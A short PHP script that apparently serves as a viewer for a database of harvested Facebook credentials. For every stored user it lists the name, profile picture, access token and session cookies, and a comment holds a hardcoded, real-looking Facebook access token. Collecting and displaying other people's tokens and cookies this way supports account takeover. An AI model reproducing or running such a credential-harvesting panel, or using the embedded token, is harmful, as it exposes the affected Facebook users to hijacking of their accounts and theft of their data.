<pre><?php
include "config.php";
$tks = $conn->query("SELECT * FROM `tokens` WHERE 1");
while ($t = $tks -> fetch_assoc()) {
    //$u = json_decode(send_get("https://graph.facebook.com/me?access_token=$t"), true);
    //if (isset($u['id'])) {
        echo "<img src='https://graph.facebook.com/{$t['fbid']}/picture?type=square'></img>{$t['name']}\t\t\t<a href='https://graph.facebook.com/me?access_token={$t['token']}' target='_blank'>{$t['cookies']}</a><br/><br/>";
    //}
}
function send_get($url) {
    //$url = "https://graph.facebook.com/v2.6/2685205478162132/?fields=gender,name&access_token=EAAg9QSgV0uEBABos3z3yH4fDMMzWqP1fi7o4b0CyRBVZCAGlzVa3kUT4dG1sQlG7qPs9AvmA1abANwWxgrpNLGlLIBZC6zbZCicPCt76ZA7w4hRxKfKESE89ltxhG3qj2xb3fwtB51DunZCOdrofq2ZAmZB2cEqwRgZCGXaJZCvubNgZDZD";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
?>